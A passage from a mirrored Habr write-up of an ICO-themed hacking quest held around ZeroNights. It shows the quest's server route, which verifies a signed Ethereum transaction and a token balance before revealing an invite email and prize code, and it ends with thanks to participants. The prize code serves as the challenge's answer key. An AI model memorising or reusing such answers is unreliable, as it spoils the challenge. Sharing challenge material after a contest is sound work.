class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">'ethereumjs-tx'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> unsign = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">'@warren-bank/ethereumjs-tx-unsign'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> util = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">'ethereumjs-util'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Web3 = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">'web3'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> web3 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Web3(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Web3.providers.HttpProvider(<span class="hljs-string"><span class="hljs-string">'http://localhost:8545/'</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> HaCoin_CONTRACT_ADDRESS = <span class="hljs-string"><span class="hljs-string">"0x9993ae26affd099e13124d8b98556e3215214e81"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> abi_h = [{<span class="hljs-string"><span class="hljs-string">"constant"</span></span>:<span class="hljs-literal"><span class="hljs-literal">true</span></span>,<span class="hljs-string"><span class="hljs-string">"inputs"</span></span>:[], ... ,<span class="hljs-string"><span class="hljs-string">"type"</span></span>:<span class="hljs-string"><span class="hljs-string">"event"</span></span>}]; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> hack = web3.eth.contract(abi_h).at(HaCoin_CONTRACT_ADDRESS); router.post(<span class="hljs-string"><span class="hljs-string">'/getInvite'</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">req, res, next</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> transaction = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Tx(req.body.tx); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (transaction.verifySignature()) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> decodedTx = unsign(transaction.serialize().toString(<span class="hljs-string"><span class="hljs-string">'hex'</span></span>), <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-literal"><span class="hljs-literal">true</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> data = web3.toAscii(decodedTx.txData.data); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> = util.bufferToHex(transaction.from); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (data === hack.symbol() &amp;&amp; web3.fromWei(hack.balanceOf(<span class="hljs-keyword"><span class="hljs-keyword">from</span></span>), <span class="hljs-string"><span class="hljs-string">"ether"</span></span>) &gt; <span class="hljs-number"><span class="hljs-number">31337</span></span>) { res.send({<span class="hljs-string"><span class="hljs-string">'success'</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">'email'</span></span>: <span class="hljs-string"><span class="hljs-string">'ico@dsec.ru'</span></span>, <span class="hljs-string"><span class="hljs-string">'code'</span></span>: <span class="hljs-string"><span class="hljs-string">'l33t_ICO_haXor_Foy1YD042c!'</span></span>}); } } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { res.send({<span class="hljs-string"><span class="hljs-string">'success'</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">'error'</span></span>: <span class="hljs-string"><span class="hljs-string">'Transaction is invalid.'</span></span>}); } res.send({<span class="hljs-string"><span class="hljs-string">'success'</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">'error'</span></span>: <span class="hljs-string"><span class="hljs-string">'Transaction is invalid.'</span></span>}); });</code> </pre> </div></div><br><p>  That's all.  Thanks to everyone who took part in the ICO and our congratulations to the winners!  For those who have woken up the desire to complete the quest - he will work a couple more days :) </p><br><p>  Many thanks also to those people who took the time before ZeroNights and helped me. </p></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/343534/">https://habr.com/ru/post/343534/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../343522/index.html">Setting up a WEB system - testing based on headless chromium-browser, chromedriver, nightwatch and node.js on Ubuntu</a></li>
<li><a href="../343524/index.html">Network JTAG programmer for Altera Quartus Prime from Raspberry Pi3</a></li>
<li><a href="../343526/index.html">Two geometric tasks that came across at the interview, and where they live</a></li>
<li><a href="../343530/index.html">Development for Sailfish OS: Using Sensors (Part 2)</a></li>
<li><a href="../343532/index.html">Mikrotik: Download speed limit for certain IP addresses</a></li>
<li><a href="../343536/index.html">Unnatural diagnostics</a></li>
<li><a href="../343538/index.html">Serverless tensorflow on AWS Lambda</a></li>
<li><a href="../343540/index.html">Google Taxes have been changed</a></li>
<li><a href="../343542/index.html">Event digest for HR specialists in the IT field for December 2017</a></li>
<li><a href="../343544/index.html">How I applied the cohort analysis while participating in a weight loss competition</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>